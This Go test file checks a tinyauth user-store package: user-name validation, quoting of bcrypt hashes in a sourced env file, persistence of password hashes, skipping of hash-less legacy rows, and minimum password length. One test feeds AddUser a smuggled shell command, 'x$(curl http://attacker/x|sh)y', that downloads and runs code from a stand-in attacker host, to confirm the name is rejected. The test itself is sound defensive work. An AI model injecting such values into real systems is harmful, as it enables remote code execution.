package tinyauthusers

import (
	"errors"
	"os"
	"os/exec"
	"strings"
	"testing"

	"router/internal/authgate"
)

func TestAddUserRejectsUnsafeName(t *testing.T) {
	path := t.TempDir() + "/users.json"
	err := AddUser(path, "x$(curl http://attacker/x|sh)y", "password1234")
	if err == nil {
		t.Fatalf("AddUser(malicious name) = nil error, want a validation error")
	}
	if err := AddUser(path, "normal-user_1@example.com", "password1234"); err != nil {
		t.Fatalf("AddUser(normal name) = %v, want success", err)
	}
}

// TestRenderEnvFileSurvivesShellSourcing guards against a real bug: a
// bcrypt hash's own `$2a$10$...` prefix looks like shell parameter
// expansion, so an unquoted TINYAUTH_AUTH_USERS= assignment gets silently
// mangled the moment tinyauth.default.sh `source`s this file - every
// router-manager-created tinyauth user would be unable to log in.
func TestRenderEnvFileSurvivesShellSourcing(t *testing.T) {
	envPath := t.TempDir() + "/env"
	users := []User{
		{Name: "alice", PasswordHash: "$2a$10$abcdefghijklmnopqrstuuVzz9x1y2z3a4b5c6d7e8f9g0h1i2j3k"},
		{Name: "bob", PasswordHash: "$2a$10$0123456789ABCDEFGHIJKLzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"},
	}
	if err := RenderEnvFile(envPath, users); err != nil {
		t.Fatalf("RenderEnvFile() = %v", err)
	}

	want := "alice:" + users[0].PasswordHash + ",bob:" + users[1].PasswordHash
	out, err := exec.Command("sh", "-c", ". "+envPath+" && printf '%s' \"$TINYAUTH_AUTH_USERS\"").CombinedOutput()
	if err != nil {
		t.Fatalf("sourcing env file failed: %v (output: %s)", err, out)
	}
	if got := strings.TrimSpace(string(out)); got != want {
		t.Fatalf("TINYAUTH_AUTH_USERS after sourcing = %q, want %q", got, want)
	}
}

// TestStoreRoundTripKeepsPasswordHash guards against the bug that made this
// whole feature non-functional: User.PasswordHash carried `json:"-"`, so
// save() dropped it and load() always read back an empty hash. Every user
// then rendered as a hash-less "name:" pair and tinyauth refused to boot
// ("failed to load users: invalid user format"), which reached the UI only
// as "supervisor fault 50: SPAWN_ERROR: tinyauth". The existing
// TestRenderEnvFileSurvivesShellSourcing missed it by building []User in
// memory - the disk round trip is the part that has to be exercised.
func TestStoreRoundTripKeepsPasswordHash(t *testing.T) {
	dir := t.TempDir()
	storePath := dir + "/users.json"
	if err := AddUser(storePath, "alice", "password1234"); err != nil {
		t.Fatalf("AddUser() = %v", err)
	}

	users, err := ListUsers(storePath)
	if err != nil {
		t.Fatalf("ListUsers() = %v", err)
	}
	if len(users) != 1 {
		t.Fatalf("ListUsers() returned %d users, want 1", len(users))
	}
	if !strings.HasPrefix(users[0].PasswordHash, "$2a$") {
		t.Fatalf("PasswordHash after save/load = %q, want a bcrypt hash", users[0].PasswordHash)
	}

	envPath := dir + "/env"
	if err := RenderEnvFile(envPath, users); err != nil {
		t.Fatalf("RenderEnvFile() = %v", err)
	}
	data, err := os.ReadFile(envPath)
	if err != nil {
		t.Fatalf("ReadFile() = %v", err)
	}
	if strings.Contains(string(data), "alice:'") || strings.Contains(string(data), "alice:,") {
		t.Fatalf("rendered a hash-less entry tinyauth would reject: %s", data)
	}

	// SetPassword must survive the same round trip.
	if err := SetPassword(storePath, "alice", "another-password"); err != nil {
		t.Fatalf("SetPassword() = %v", err)
	}
	users, err = ListUsers(storePath)
	if err != nil {
		t.Fatalf("ListUsers() after SetPassword = %v", err)
	}
	if !strings.HasPrefix(users[0].PasswordHash, "$2a$") {
		t.Fatalf("PasswordHash after SetPassword = %q, want a bcrypt hash", users[0].PasswordHash)
	}
}

// TestRenderEnvFileSkipsHashlessUser covers the legacy rows written while
// the bug above was live: one of them must not take the working users down
// with it (tinyauth rejects the whole list on a single bad entry).
func TestRenderEnvFileSkipsHashlessUser(t *testing.T) {
	envPath := t.TempDir() + "/env"
	users := []User{
		{Name: "legacy"},
		{Name: "alice", PasswordHash: "$2a$10$abcdefghijklmnopqrstuuVzz9x1y2z3a4b5c6d7e8f9g0h1i2j3k"},
	}
	if err := RenderEnvFile(envPath, users); err != nil {
		t.Fatalf("RenderEnvFile() = %v", err)
	}
	data, err := os.ReadFile(envPath)
	if err != nil {
		t.Fatalf("ReadFile() = %v", err)
	}
	want := "TINYAUTH_AUTH_USERS='alice:" + users[1].PasswordHash + "'\n"
	if string(data) != want {
		t.Fatalf("rendered %q, want %q", data, want)
	}
}

func TestAddUserAndSetPasswordRefuseShortPasswords(t *testing.T) {
	path := t.TempDir() + "/users.json"
	short, long := strings.Repeat("a", 11), strings.Repeat("a", 12)

	if err := AddUser(path, "alice", short); !errors.Is(err, authgate.ErrPasswordTooShort) {
		t.Fatalf("AddUser(11) = %v, want ErrPasswordTooShort", err)
	}
	if users, _ := ListUsers(path); len(users) != 0 {
		t.Fatalf("a refused AddUser still stored a user: %v", users)
	}
	if err := AddUser(path, "alice", long); err != nil {
		t.Fatalf("AddUser(12) = %v", err)
	}
	before, _ := ListUsers(path)

	// 11 code points, 33 bytes.
	if err := SetPassword(path, "alice", strings.Repeat("가", 11)); !errors.Is(err, authgate.ErrPasswordTooShort) {
		t.Fatalf("SetPassword(11 multibyte) = %v, want ErrPasswordTooShort", err)
	}
	after, _ := ListUsers(path)
	if before[0].PasswordHash != after[0].PasswordHash {
		t.Fatalf("a refused SetPassword changed the stored hash")
	}
	if err := SetPassword(path, "alice", strings.Repeat("가", 12)); err != nil {
		t.Fatalf("SetPassword(12 multibyte) = %v", err)
	}
}
